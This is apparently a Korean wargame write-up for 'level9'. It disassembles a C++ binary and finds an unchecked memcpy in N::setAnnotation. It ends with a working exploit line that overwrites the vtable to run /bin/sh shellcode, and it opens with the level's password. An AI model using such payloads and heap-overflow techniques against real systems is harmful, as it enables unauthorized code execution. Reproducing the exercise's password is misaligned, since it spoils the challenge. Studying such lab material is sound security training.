> Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

단순히 objdump -d 로 어셈블리 코드를 추출하면 함수의 이름이 깨지는 것으로 봐서 naming mangling이 적용된 c++코드인 것을 알 수 있다 따라서 --demangle 옵션을 줘서 추출한다.

어셈블리 코드를 보면 

```
080485f4 <main>:
 80485f4:	55                   	push   %ebp
 80485f5:	89 e5                	mov    %esp,%ebp
 80485f7:	53                   	push   %ebx
 80485f8:	83 e4 f0             	and    $0xfffffff0,%esp
 80485fb:	83 ec 20             	sub    $0x20,%esp
 80485fe:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
 8048602:	7f 0c                	jg     8048610 <main+0x1c>
```

먼저 인자의 개수가 1개인지 확인한 뒤 1개가 아닐 경우 바로 종료한다.

0개일 경우

```
 8048610:	c7 04 24 6c 00 00 00 	movl   $0x6c,(%esp)
 8048617:	e8 14 ff ff ff       	call   8048530 <operator new(unsigned int)@plt>
 804861c:	89 c3                	mov    %eax,%ebx
 804861e:	c7 44 24 04 05 00 00 	movl   $0x5,0x4(%esp)
 8048625:	00 
 8048626:	89 1c 24             	mov    %ebx,(%esp)
 8048629:	e8 c8 00 00 00       	call   80486f6 <N::N(int)>
```

위 코드와 같이 N클래스의 인스턴스를 2번 생성한 이후

```
 8048664:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048667:	83 c0 04             	add    $0x4,%eax
 804866a:	8b 00                	mov    (%eax),%eax
 804866c:	89 44 24 04          	mov    %eax,0x4(%esp) 
 8048670:	8b 44 24 14          	mov    0x14(%esp),%eax
 8048674:	89 04 24             	mov    %eax,(%esp)
 8048677:	e8 92 00 00 00       	call   804870e <N::setAnnotation(char*)>
```

setAnnotation이라는 맴버 함수를 argv[1]을 인자로 하여 호출한다.

```
0804870e <N::setAnnotation(char*)>:
 804870e:	55                   	push   %ebp
 804870f:	89 e5                	mov    %esp,%ebp
 8048711:	83 ec 18             	sub    $0x18,%esp
 8048714:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048717:	89 04 24             	mov    %eax,(%esp)
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    0x8(%ebp),%edx
 8048722:	83 c2 04             	add    $0x4,%edx
 8048725:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax
 804872c:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048730:	89 14 24             	mov    %edx,(%esp)
 memcpy(this + 4?, argv[1], );
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
 8048738:	c9                   	leave  
 8048739:	c3                   	ret
```

setannotation은 단순히 클래스의 버퍼에 인자로 들어온 문자열을 복사하는 함수인데, 버퍼 오버플로우에 가능성이 있어보인다.

이후 vtable에서 어떤 함수를 가져와서 실행하는 것을 볼 수 있다.

```
 804867c:	8b 44 24 10          	mov    0x10(%esp),%eax
 8048680:	8b 00                	mov    (%eax),%eax
 8048682:	8b 10                	mov    (%eax),%edx
 8048684:	8b 44 24 14          	mov    0x14(%esp),%eax
 8048688:	89 44 24 04          	mov    %eax,0x4(%esp)
 804868c:	8b 44 24 10          	mov    0x10(%esp),%eax
 8048690:	89 04 24             	mov    %eax,(%esp)
 8048693:	ff d2                	call   *%edx
```

따라서 위에 setAnnotation함수에서 vtable을 덮어써서 쉘코드를 실행시킬 수 있다.

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 76) + "\x0c\xa0\x04\x08",')
```